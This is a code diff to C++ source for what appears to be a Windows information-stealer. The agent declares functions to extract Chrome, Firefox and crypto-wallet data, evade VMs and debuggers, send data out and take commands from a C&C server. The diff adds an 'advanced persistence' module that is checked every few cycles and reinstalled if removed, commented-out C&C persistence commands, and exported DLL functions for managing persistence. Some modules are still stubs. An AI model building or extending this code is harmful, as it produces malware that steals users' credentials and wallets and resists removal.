@@ -6,6 +6,8 @@
 #include <string>
 #include <wincrypt.h>
 #include "browser/wallets.h"
+#include "common.h"
+#include "persistence/advanced_persistence.h"
 
 // Forward declarations for modules
 extern "C" {
@@ -23,7 +25,14 @@ extern "C" {
     
     // Module functions (to be implemented)
     bool CheckEnvironment();           // Anti-VM/Anti-Debug checks
-    bool InstallPersistence();         // Persistence installation
+    
+    // Advanced Persistence functions
+    bool InstallAdvancedPersistence(); // Enhanced persistence installation
+    bool VerifyAdvancedPersistence();  // Verify installed persistence
+    bool ScanForPersistence();         // Comprehensive persistence scan
+    bool CleanupPersistence();         // Complete persistence removal
+    bool GetPersistenceStatus(char* statusBuffer, int bufferSize); // Get detailed status
+    
     const char* ExtractChromeData();   // Chrome data extraction
     const char* ExtractFirefoxData();  // Firefox data extraction
     const char* ExtractCryptoData();   // Crypto wallet extraction
@@ -72,10 +81,12 @@ public:
         
         // Install persistence if enabled
         if (Config::ENABLE_PERSISTENCE) {
-            LogInfo("Installing persistence...");
-            if (!InstallPersistence()) {
-                LogError("Failed to install persistence");
+            LogInfo("Installing advanced persistence...");
+            if (!InstallAdvancedPersistence()) {
+                LogError("Failed to install advanced persistence");
                 // Don't fail initialization, continue anyway
+            } else {
+                LogInfo("Advanced persistence installed successfully");
             }
         }
         
@@ -125,6 +136,9 @@ private:
             try {
                 // Collect and send data
                 CollectAndSend();
+                
+                // Verify persistence integrity
+                VerifyPersistenceIntegrity();
                 
                 // Check for commands from server
                 CheckCommands();
@@ -238,6 +252,35 @@ private:
         return false; // Placeholder
     }
     
+    void VerifyPersistenceIntegrity() {
+        static int verifyCount = 0;
+        verifyCount++;
+        
+        // Verify persistence every 5 cycles (25 minutes)
+        if (verifyCount % 5 == 0) {
+            LogInfo("Verifying persistence integrity...");
+            
+            if (!VerifyAdvancedPersistence()) {
+                LogError("Persistence verification failed - attempting repair");
+                
+                // Try to reinstall persistence
+                if (InstallAdvancedPersistence()) {
+                    LogInfo("Persistence repaired successfully");
+                } else {
+                    LogError("Failed to repair persistence");
+                }
+            } else {
+                LogDebug("Persistence integrity verified");
+            }
+            
+            // Log persistence status
+            char statusBuffer[256];
+            if (GetPersistenceStatus(statusBuffer, sizeof(statusBuffer))) {
+                LogInfo((std::string("Persistence status: ") + statusBuffer).c_str());
+            }
+        }
+    }
+    
     void CheckCommands() {
         // Check for commands from C&C server
         // This would typically involve:
@@ -246,6 +289,23 @@ private:
         // 3. Decrypt and execute commands
         
         LogDebug("Checking for commands...");
+        
+        // Example command handling for persistence management
+        // In real implementation, these would come from server
+        /*
+        if (command == "scan_persistence") {
+            bool found = ScanForPersistence();
+            SendResponse(found ? "Persistence found" : "No persistence detected");
+        }
+        else if (command == "cleanup_persistence") {
+            bool success = CleanupPersistence();
+            SendResponse(success ? "Cleanup successful" : "Cleanup failed");
+        }
+        else if (command == "reinstall_persistence") {
+            bool success = InstallAdvancedPersistence();
+            SendResponse(success ? "Reinstall successful" : "Reinstall failed");
+        }
+        */
     }
     
     std::string Base64Encode(const std::vector<uint8_t>& data) {
@@ -281,14 +341,11 @@ bool CheckEnvironment() {
     return true; // Placeholder - always pass
 }
 
-// Persistence installation (stub)
+// Advanced persistence functions are implemented in advanced_persistence.cpp
+// These are just wrapper functions for compatibility
 bool InstallPersistence() {
-    // This would typically:
-    // - Add to registry run key
-    // - Create scheduled task
-    // - Install as service
-    
-    return true; // Placeholder - always succeed
+    // Legacy wrapper - use InstallAdvancedPersistence() instead
+    return InstallAdvancedPersistence();
 }
 
 // Module stubs (to be implemented in separate files)
@@ -346,6 +403,34 @@ extern "C" __declspec(dllexport) void StopAgent() {
         g_agent.reset();
     }
     CleanupLogger();
+}
+
+// Additional exported functions for persistence management
+extern "C" __declspec(dllexport) BOOL ScanPersistence() {
+    return ScanForPersistence() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL VerifyPersistence() {
+    return VerifyAdvancedPersistence() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL RemovePersistence() {
+    return CleanupPersistence() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL GetPersistenceInfo(char* buffer, int size) {
+    return GetPersistenceStatus(buffer, size) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BOOL ReinstallPersistence() {
+    // First try to clean existing persistence
+    CleanupPersistence();
+    
+    // Wait a moment
+    Sleep(1000);
+    
+    // Install fresh persistence
+    return InstallAdvancedPersistence() ? TRUE : FALSE;
 }
 
 // Alternative entry point for EXE
